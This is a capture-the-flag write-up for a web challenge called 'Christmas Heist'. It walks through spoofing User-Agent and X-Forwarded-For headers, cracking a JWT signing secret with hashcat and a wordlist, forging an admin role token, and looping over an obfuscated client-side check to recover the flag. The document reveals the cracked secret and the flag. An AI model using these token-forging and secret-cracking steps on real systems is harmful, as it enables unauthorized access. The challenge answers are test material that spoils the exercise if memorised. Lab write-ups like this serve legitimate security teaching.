# Christmas Heist

From the question, we realise that we need to impersonate a windows 95 computer from Turkey. (where Santa Claus's legend was born, from Saint Nicholas). Hence, we can set the Headers,
```python
User-agent: some_Windows_95_user_agent # ex: Opera/9.80 (Windows 95) Presto/2.12.388 Version/12.13
```
and 
```python
X-Forwarded-For: some _ip_address_from_turkey # ex: 31.143.76.255
```

Logging in as `guest`, we will see a dummy page that is not really relevant, but we see that a cookie is set.

Analysing the cookie that is set, we see in the payload that we have the `username` and `role` in base64 encoded form.
```json
{
  "username": "Z3Vlc3Q=",
  "role": "MA==",
  "iat": 1677615140
}
```

 >`base64decode(Z3Vlc3Q=) == guest` and `base64decode(MA==) == 0`


The role is initially set to '0' and setting it to '1' usually gives you admin privileges. Bruteforcing the jwt secret, with `hashcat -a0 -m 16500 jwt.hash rockyou.txt --show` we get

>`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlozVmxjM1E9Iiwicm9sZSI6Ik1BPT0iLCJpYXQiOjE2Nzc2NjI1ODh9.pm9UUbOnOR1Y3mm-rBKfZLdFoTeFXtUFMmMtn2nAuYk:anastacia`

[P.S. Your JWT might be different but secret key will remain the same]

Hence, with `anastacia` as secret key, change the payload to `role:1` in base64 encoded form and login.

```json
{
  "username": "Z3Vlc3Q=",
  "role": "MQ==",
  "iat": 1677615140
}
```
 >`base64decode(MQ==) == 1`

Now we see an `admin page` which requires us to name a city in `Turkey`.
Analysing the page source, we see that there is a static `js` script that is obfuscated. Going through it, we see a list of cities in Turkey among other things. A function that catches our eye is `akdslfhjaksdfhj` which takes an input, does compares it to a particular city in `cities` array and returns `true` or `false`.  

Thus, we can use the browser console and loop thorugh the array `cities` and call the funtion on each of them to see which city returns `true`. 
```js
for(let a=0; a<cities.length; a++){
    if(akdslfhjaksdfhj(cities[a])){
        console.log(cities[a]);
        break;
    }
}
```
The city is `Canakkale`, on entering which, we get a route that gives the flag,

`p_ctf{h34de7s_4nd_jw9_4re_f0n}`.